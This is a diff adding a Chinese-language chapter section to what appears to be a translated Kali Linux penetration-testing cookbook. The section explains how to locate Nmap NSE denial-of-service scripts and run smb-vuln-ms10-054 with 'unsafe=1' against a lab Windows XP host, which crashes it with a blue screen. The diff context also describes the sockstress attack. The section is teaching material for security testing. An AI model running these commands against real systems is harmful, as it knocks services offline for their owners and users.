@@ -1369,3 +1369,109 @@ Fixing IP Tables
 ### 工作原理
 
 在 sockstress DoS 中，三次握手中的最后的 ACK 封包的窗口值为 0。由于连接客户端的空窗口所示，漏洞服务不会传送任何数据来响应连接。 相反，服务器会保存要在内存中传输的数据。 使用这些连接充斥服务器将耗尽服务器的资源，包括内存，交换空间和计算能力。
+
+## 6.9 使用 Nmap NSE 执行 DoS 攻击
+
+Nmap 脚本引擎（NSE）拥有许多可用于执行 DoS 攻击的脚本。 这个特定的秘籍演示了如何找到 NSE DoS 脚本，确定脚本的用法，以及如何执行它们。
+
+### 准备
+
+为了使用 Nmap NSE 执行 DoS 攻击，你需要有一个运行漏洞服务的系统，它易受 Nmap NSE DoS 脚本之一的攻击。 所提供的示例使用 Windows XP 的实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。
+
+### 操作步骤
+
+在使用 Nmap NSE 脚本执行 DoS 测试之前，我们需要确定哪些 DoS 脚本可用。 在 Nmap NSE 脚本目录中有一个`greppable script.db`文件，可用于确定任何给定类别中的脚本：
+
+```
+root@KaliLinux:~# grep dos /usr/share/nmap/scripts/script.db | cut -d "\"" -f 2 
+broadcast-avahi-dos.nse 
+http-slowloris.nse ipv6-ra-flood.nse
+smb-check-vulns.nse 
+smb-flood.nse 
+smb-vuln-ms10-054.nse 
+```
+
+通过从`script.db`文件中使用`grep`搜索 DoS，然后将输出通过管道传递到`cut`函数，我们可以提取可用的脚本。 通过阅读任何一个脚本的头部，我们通常可以找到很多有用的信息：
+
+```
+root@KaliLinux:~# cat /usr/share/nmap/scripts/smb-vuln-ms10-054.nse | more 
+local bin = require "bin" 
+local msrpc = require "msrpc" 
+local smb = require "smb" 
+local string = require "string" 
+local vulns = require "vulns" 
+local stdnse = require "stdnse"
+
+description = [[ 
+Tests whether target machines are vulnerable to the ms10-054 SMB remote memory 
+corruption vulnerability.
+
+The vulnerable machine will crash with BSOD. 
+
+The script requires at least READ access right to a share on a remote machine. 
+Either with guest credentials or with specified username/password. 
+```
+为了从上到下读取脚本，我们应该对文件使用`cat`命令，然后通过管道输出到`more`工具。 脚本的头部描述了它所利用的漏洞以及系统必须满足的条件。 它还解释了该漏洞将导致蓝屏死机（BSOD）DoS。 通过进一步向下滚动，我们可以找到更多有用的信息：
+
+```
+-- @usage nmap  -p 445 <target> 
+--script=smb-vuln-ms10-054 
+--script-args unsafe 
+--- @args unsafe Required to run the script, "safty swich" to prevent running it by accident 
+-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)
+
+-- @usage nmap  -p 445 <target> 
+--script=smb-vuln-ms10-054 
+--script-args unsafe 
+--- @args unsafe Required to run the script, "safty swich" to prevent running it by accident 
+-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)
+
+
+-- @output 
+-- Host script results: 
+-- | smb-vuln-ms10-054: 
+-- |   VULNERABLE: 
+-- |   SMB remote memory corruption vulnerability 
+-- |     State: VULNERABLE 
+-- |     IDs:  CVE:CVE-2010-2550 
+-- |     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/ A:C) 
+-- |     Description: 
+-- |       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
+-- |       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7 
+-- |       does not properly validate fields in an SMB request, which allows remote attackers 
+-- |       to execute arbitrary code via a crafted SMB packet, aka "SMB Pool Overflow Vulnerability."
+```
+
+在脚本中，我们可以找到脚本用法和脚本提供的参数的描述。 它还提供了有关其利用的漏洞的其他详细信息。 要执行脚本，我们需要在 Nmap 中使用`--script`选项：
+
+```
+root@KaliLinux:~# nmap -p 445 172.16.36.134 --script=smb-vuln-ms10-054 --script-args unsafe=1
+
+Starting Nmap 6.25 ( http://nmap.org ) at 2014-02-28 23:45 EST 
+Nmap scan report for 172.16.36.134 
+Host is up (0.00038s latency). 
+PORT    STATE SERVICE 
+445/tcp open  microsoft-ds 
+MAC Address: 00:0C:29:18:11:FB (VMware)
+
+Host script results: 
+| smb-vuln-ms10-054: 
+|   VULNERABLE: 
+|   SMB remote memory corruption vulnerability 
+|     State: VULNERABLE 
+|     IDs:  CVE:CVE-2010-2550
+|     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C) 
+|     Description: 
+|       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
+|       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7 
+|       does not properly validate fields in an SMB request, which allows remote attackers 
+|       to execute arbitrary code via a crafted SMB packet, aka "SMB Pool Overflow Vulnerability."
+```
+
+在提供的示例中，Nmap 被定向为仅扫描 TCP 端口 445，这是该漏洞的相关端口。 `--script`选项与指定所使用的脚本的参数一起使用。 我们传递了单个脚本参数来表明可以接受不安全扫描。 此参数的描述是，可用于授权 DoS 攻击的安全开关。 在 Nmap 中执行脚本后，输出表明系统存在漏洞。 查看 Windows XP 机器，我们可以看到 DoS 成功，这导致了蓝屏：
+
+![](img/6-9-1.jpg)
+
+### 工作原理
+
+本练习中演示的 Nmap NSE 脚本是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。
